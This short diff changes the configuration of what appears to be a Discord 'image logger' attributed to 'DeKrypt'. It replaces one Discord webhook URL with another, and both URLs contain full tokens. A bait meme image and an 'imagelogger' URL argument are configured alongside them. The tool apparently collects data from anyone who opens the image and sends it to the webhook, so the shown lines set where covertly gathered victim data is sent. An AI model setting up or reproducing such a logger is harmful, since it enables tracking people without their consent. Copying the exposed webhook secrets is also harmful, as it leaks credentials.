@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1385739698420584478/ntID6jnJO2ZTSAxYVe_6QGcMwfPSLu3ITpqVSzHqcGbpmkbMTDNpsys543liOjdn4bN7",
+    "webhook": "https://discord.com/api/webhooks/1474518331317948426/jpUfLnepVu0APVBHx7ZHvIVpUy2UQgogmWoK0litC63vMHgaLmkzJgZTcis7DtSv05j7",
     "image": "https://www.vhv.rs/dpng/d/2-29520_spongebob-meme-face-png-transparent-png.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
